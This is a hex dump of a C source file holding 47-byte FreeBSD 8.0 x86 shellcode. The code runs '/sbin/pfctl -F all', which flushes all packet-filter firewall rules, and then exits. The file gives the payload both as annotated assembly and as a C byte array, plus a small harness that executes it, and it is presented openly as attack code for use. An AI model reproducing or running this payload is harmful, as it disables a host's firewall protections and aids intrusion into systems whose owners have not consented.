00000000  2f 2a 20 0d 0a 20 2a 20  54 69 74 6c 65 3a 20 46  |/* .. * Title: F|
00000010  72 65 65 42 53 44 20 38  2e 30 2d 52 45 4c 45 41  |reeBSD 8.0-RELEA|
00000020  53 45 2f 78 38 36 20 27  2f 2f 73 62 69 6e 2f 70  |SE/x86 '//sbin/p|
00000030  66 63 74 6c 20 2d 46 20  61 6c 6c 20 53 68 65 6c  |fctl -F all Shel|
00000040  6c 63 6f 64 65 20 34 37  20 42 79 74 65 73 27 0d  |lcode 47 Bytes'.|
00000050  0a 20 2a 20 54 79 70 65  3a 20 53 68 65 6c 6c 63  |. * Type: Shellc|
00000060  6f 64 65 0d 0a 20 2a 20  41 75 74 68 6f 72 3a 20  |ode.. * Author: |
00000070  61 6e 74 72 68 61 63 6b  73 0d 0a 20 2a 20 50 6c  |antrhacks.. * Pl|
00000080  61 74 66 6f 72 6d 3a 20  46 72 65 65 42 53 44 20  |atform: FreeBSD |
00000090  38 2e 30 2d 52 45 4c 45  41 53 45 0d 0a 2a 2f 0d  |8.0-RELEASE..*/.|
000000a0  0a 0d 0a 2f 2a 20 41 53  53 65 6d 62 6c 79 0d 0a  |.../* ASSembly..|
000000b0  20 33 31 20 63 30 20 20  20 20 20 20 20 20 20 20  | 31 c0          |
000000c0  20 20 20 20 20 20 09 78  6f 72 20 20 20 20 25 65  |      .xor    %e|
000000d0  61 78 2c 25 65 61 78 0d  0a 20 35 30 20 20 20 20  |ax,%eax.. 50    |
000000e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
000000f0  70 75 73 68 20 20 20 25  65 61 78 0d 0a 20 36 38  |push   %eax.. 68|
00000100  20 32 64 20 34 36 20 36  31 20 36 63 20 20 20 20  | 2d 46 61 6c    |
00000110  20 20 20 09 70 75 73 68  20 20 20 24 30 78 36 63  |   .push   $0x6c|
00000120  36 31 34 36 32 64 0d 0a  20 38 39 20 65 31 20 20  |61462d.. 89 e1  |
00000130  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 6d  |              .m|
00000140  6f 76 20 20 20 20 25 65  73 70 2c 25 65 63 78 0d  |ov    %esp,%ecx.|
00000150  0a 20 35 30 20 20 20 20  20 20 20 20 20 20 20 20  |. 50            |
00000160  20 20 20 20 20 20 20 09  70 75 73 68 20 20 20 25  |       .push   %|
00000170  65 61 78 0d 0a 20 36 38  20 36 36 20 36 33 20 37  |eax.. 68 66 63 7|
00000180  34 20 36 63 20 20 20 20  20 20 20 09 70 75 73 68  |4 6c       .push|
00000190  20 20 20 24 30 78 36 63  37 34 36 33 36 36 0d 0a  |   $0x6c746366..|
000001a0  20 36 38 20 36 39 20 36  65 20 32 66 20 37 30 20  | 68 69 6e 2f 70 |
000001b0  20 20 20 20 20 20 09 70  75 73 68 20 20 20 24 30  |      .push   $0|
000001c0  78 37 30 32 66 36 65 36  39 0d 0a 20 36 38 20 32  |x702f6e69.. 68 2|
000001d0  66 20 32 66 20 37 33 20  36 32 20 20 20 20 20 20  |f 2f 73 62      |
000001e0  20 09 70 75 73 68 20 20  20 24 30 78 36 32 37 33  | .push   $0x6273|
000001f0  32 66 32 66 0d 0a 20 38  39 20 65 33 20 20 20 20  |2f2f.. 89 e3    |
00000200  20 20 20 20 20 20 20 20  20 20 20 20 09 6d 6f 76  |            .mov|
00000210  20 20 20 20 25 65 73 70  2c 25 65 62 78 0d 0a 20  |    %esp,%ebx.. |
00000220  35 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |50              |
00000230  20 20 20 20 20 09 70 75  73 68 20 20 20 25 65 61  |     .push   %ea|
00000240  78 0d 0a 20 35 31 20 20  20 20 20 20 20 20 20 20  |x.. 51          |
00000250  20 20 20 20 20 20 20 20  20 09 70 75 73 68 20 20  |         .push  |
00000260  20 25 65 63 78 0d 0a 20  35 33 20 20 20 20 20 20  | %ecx.. 53      |
00000270  20 20 20 20 20 20 20 20  20 20 20 20 20 09 70 75  |             .pu|
00000280  73 68 20 20 20 25 65 62  78 0d 0a 20 38 39 20 65  |sh   %ebx.. 89 e|
00000290  31 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1               |
000002a0  20 09 6d 6f 76 20 20 20  20 25 65 73 70 2c 25 65  | .mov    %esp,%e|
000002b0  63 78 0d 0a 20 35 30 20  20 20 20 20 20 20 20 20  |cx.. 50         |
000002c0  20 20 20 20 20 20 20 20  20 20 09 70 75 73 68 20  |          .push |
000002d0  20 20 25 65 61 78 0d 0a  20 35 31 20 20 20 20 20  |  %eax.. 51     |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 09 70  |              .p|
000002f0  75 73 68 20 20 20 25 65  63 78 0d 0a 20 35 33 20  |ush   %ecx.. 53 |
00000300  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000310  20 20 09 70 75 73 68 20  20 20 25 65 62 78 0d 0a  |  .push   %ebx..|
00000320  20 62 30 20 33 62 20 20  20 20 20 20 20 20 20 20  | b0 3b          |
00000330  20 20 20 20 20 20 09 6d  6f 76 20 20 20 20 24 30  |      .mov    $0|
00000340  78 33 62 2c 25 61 6c 0d  0a 20 35 30 20 20 20 20  |x3b,%al.. 50    |
00000350  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 09  |               .|
00000360  70 75 73 68 20 20 20 25  65 61 78 0d 0a 20 63 64  |push   %eax.. cd|
00000370  20 38 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | 80             |
00000380  20 20 20 09 69 6e 74 20  20 20 20 24 30 78 38 30  |   .int    $0x80|
00000390  0d 0a 20 33 31 20 63 30  20 20 20 20 20 20 20 20  |.. 31 c0        |
000003a0  20 20 20 20 20 20 20 20  09 78 6f 72 20 20 20 20  |        .xor    |
000003b0  25 65 61 78 2c 25 65 61  78 0d 0a 20 35 30 20 20  |%eax,%eax.. 50  |
000003c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003d0  20 09 70 75 73 68 20 20  20 25 65 61 78 0d 0a 20  | .push   %eax.. |
000003e0  35 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |50              |
000003f0  20 20 20 20 20 09 70 75  73 68 20 20 20 25 65 61  |     .push   %ea|
00000400  78 0d 0a 20 63 64 20 38  30 20 20 20 20 20 20 20  |x.. cd 80       |
00000410  20 20 20 20 20 20 20 20  20 09 69 6e 74 20 20 20  |         .int   |
00000420  20 24 30 78 38 30 0d 0a  2a 2f 0d 0a 0d 0a 0d 0a  | $0x80..*/......|
00000430  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000440  68 3e 0d 0a 0d 0a 69 6e  74 20 6d 61 69 6e 28 29  |h>....int main()|
00000450  7b 0d 0a 63 68 61 72 20  73 68 65 6c 6c 63 6f 64  |{..char shellcod|
00000460  65 5b 5d 20 3d 20 22 5c  78 33 31 5c 78 63 30 5c  |e[] = "\x31\xc0\|
00000470  78 35 30 5c 78 36 38 5c  78 32 64 5c 78 34 36 5c  |x50\x68\x2d\x46\|
00000480  78 36 31 5c 78 36 63 5c  78 38 39 5c 78 65 31 5c  |x61\x6c\x89\xe1\|
00000490  78 35 30 5c 78 36 38 5c  78 36 36 5c 78 36 33 5c  |x50\x68\x66\x63\|
000004a0  78 37 34 5c 78 36 63 22  0d 0a 22 5c 78 36 38 5c  |x74\x6c".."\x68\|
000004b0  78 36 39 5c 78 36 65 5c  78 32 66 5c 78 37 30 5c  |x69\x6e\x2f\x70\|
000004c0  78 36 38 5c 78 32 66 5c  78 32 66 5c 78 37 33 5c  |x68\x2f\x2f\x73\|
000004d0  78 36 32 5c 78 38 39 5c  78 65 33 5c 78 35 30 5c  |x62\x89\xe3\x50\|
000004e0  78 35 31 5c 78 35 33 22  0d 0a 22 5c 78 38 39 5c  |x51\x53".."\x89\|
000004f0  78 65 31 5c 78 35 30 5c  78 35 31 5c 78 35 33 5c  |xe1\x50\x51\x53\|
00000500  78 62 30 5c 78 33 62 5c  78 35 30 5c 78 63 64 5c  |xb0\x3b\x50\xcd\|
00000510  78 38 30 5c 78 33 31 5c  78 63 30 5c 78 35 30 5c  |x80\x31\xc0\x50\|
00000520  78 35 30 5c 78 63 64 5c  78 38 30 22 3b 20 0d 0a  |x50\xcd\x80"; ..|
00000530  0d 0a 20 70 72 69 6e 74  66 28 22 5b 2a 5d 20 53  |.. printf("[*] S|
00000540  68 65 6c 6c 43 6f 64 65  20 73 69 7a 65 20 28 62  |hellCode size (b|
00000550  79 74 65 73 29 3a 20 25  64 5c 6e 5c 6e 22 2c 20  |ytes): %d\n\n", |
00000560  73 69 7a 65 6f 66 28 73  68 65 6c 6c 63 6f 64 65  |sizeof(shellcode|
00000570  29 2d 31 20 29 3b 0d 0a  0d 0a 28 2a 28 76 6f 69  |)-1 );....(*(voi|
00000580  64 20 28 2a 29 28 29 29  73 68 65 6c 6c 63 6f 64  |d (*)())shellcod|
00000590  65 29 28 29 3b 0d 0a 0d  0a 72 65 74 75 72 6e 20  |e)();....return |
000005a0  30 3b 0d 0a 7d                                    |0;..}|
000005a5
